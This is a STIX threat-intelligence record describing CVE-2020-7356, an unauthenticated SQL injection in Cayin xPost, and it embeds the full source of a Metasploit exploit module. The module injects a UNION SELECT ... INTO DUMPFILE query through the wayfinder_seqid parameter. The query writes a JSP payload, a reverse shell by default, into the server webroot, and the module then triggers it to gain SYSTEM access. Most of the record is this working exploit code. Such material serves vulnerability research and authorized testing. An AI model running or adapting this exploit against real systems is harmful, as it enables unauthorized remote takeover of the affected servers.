{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f47c824e-7210-4786-b2a5-d076ed68a2a0",
    "created": "2024-08-14T16:53:08.129059Z",
    "modified": "2024-08-14T16:53:08.129063Z",
    "name": "Cayin xPost wayfinder_seqid SQLi to RCE",
    "description": " This module exploits an unauthenticated SQLi in Cayin xPost <=2.5.  The wayfinder_meeting_input.jsp file's wayfinder_seqid parameter can be injected with a blind SQLi.  Since this app bundles MySQL and apache Tomcat the environment is pretty static and therefore the default settings should work.  Results in SYSTEM level access. Only the java/jsp_shell_reverse_tcp and java/jsp_shell_bind_tcp payloads seem to be valid.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/cayin_xpost_sql_rce.rb",
            "external_id": "cayin_xpost_sql_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5571.php"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-7356"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cayin xPost wayfinder_seqid SQLi to RCE',\n        'Description' => %q{\n          This module exploits an unauthenticated SQLi in Cayin xPost <=2.5.  The\n          wayfinder_meeting_input.jsp file's wayfinder_seqid parameter can be injected\n          with a blind SQLi.  Since this app bundles MySQL and apache Tomcat the\n          environment is pretty static and therefore the default settings should\n          work.  Results in SYSTEM level access.\n          Only the java/jsp_shell_reverse_tcp and java/jsp_shell_bind_tcp payloads\n          seem to be valid.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Gjoko Krstic (LiquidWorm) <gjoko@zeroscience.mk>' # original PoC, discovery\n        ],\n        'References' => [\n          [ 'EDB', '48558' ],\n          [ 'URL', 'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5571.php' ],\n          [ 'CVE', '2020-7356' ]\n        ],\n        'Platform' => ['java', 'win'],\n        'Privileged' => true,\n        'Arch' => ARCH_JAVA,\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2020-06-04',\n\n        'DefaultOptions' => {\n          'PAYLOAD' => 'java/jsp_shell_reverse_tcp'\n        },\n        # meterpreter is too large for payload space\n        'Payload' => {\n          'Space' => 2000,\n          'DisableNops' => true\n        },\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [true, 'The URI of Cayin xPost', '/']),\n        OptString.new('LOCALWEBROOT', [true, 'Local install path webroot', 'C:/CayinApps/webapps/' ]), # default location\n        OptString.new('PAYLOADNAME', [false, 'Name of payload file to write', ''])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'cayin', 'js', 'English', 'language.js')\n    )\n\n    if res.nil? || res.code != 200\n      return CheckCode::Safe('Could not connect to the web service, check URI Path and IP')\n    end\n\n    %r{// xPost v(?<version>[\\d.]+) } =~ res.body\n\n    if version && Rex::Version.new(version) <= Rex::Version.new('2.5')\n      print_good(\"Version Detected: #{version}\")\n      return CheckCode::Appears\n    end\n\n    # try a backup plan, at least verify the title\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'cayin', 'index.jsp')\n    )\n\n    if res.nil? || res.code != 200\n      return CheckCode::Safe('Could not connect to the web service, check URI Path and IP')\n\n    end\n\n    if res.body =~ %r{<title>xPost</title>}\n      vprint_good('HTML Title includes xPost')\n      return CheckCode::Detected\n    end\n    CheckCode::Safe\n  rescue ::Rex::ConnectionError\n    CheckCode::Safe('Could not connect to the web service, check URI Path and IP')\n  end\n\n  def exploit\n    filename = datastore['PAYLOADNAME'].blank? ? \"#{rand_text_alphanumeric(6..12)}.jsp\" : datastore['PAYLOADNAME']\n    filename = \"#{filename}.jsp\" unless filename.end_with? '.jsp'\n\n    vprint_status(\"Utilizing payload filename #{filename}\")\n    vprint_status(\"Payload Size: #{payload.encoded.length}\")\n    vprint_status(\"Payload Size Encoded: #{payload.encoded.unpack1('H*').length}\")\n\n    payload_request = \"-251' UNION ALL SELECT 0x\"\n    payload_request << payload.encoded.unpack1('H*')\n    payload_request << ',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL '\n    payload_request << \"INTO DUMPFILE '#{datastore['LOCALWEBROOT']}#{filename}'-- -\"\n    payload_request.gsub!(' ', '%20')\n\n    vprint_status('Attempting Exploitation')\n    uri = normalize_uri(target_uri.path, 'cayin', 'wayfinder', 'wayfinder_meeting_input.jsp')\n    # use raw to prevent encoding of injection characters\n    res = send_request_raw(\n      'uri' => \"#{uri}?wayfinder_seqid=#{payload_request}\"\n    )\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n\n    if res.code == 400\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Payload too large, utilize a smaller payload\")\n    end\n\n    if res.code != 302\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid response to injection\")\n    end\n\n    register_file_for_cleanup(\"#{datastore['LOCALWEBROOT']}#{filename}\")\n\n    vprint_status('Triggering uploaded payload')\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, filename)\n    )\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-06-04",
    "x_mitre_platforms": [
        "['java', 'win']"
    ]
}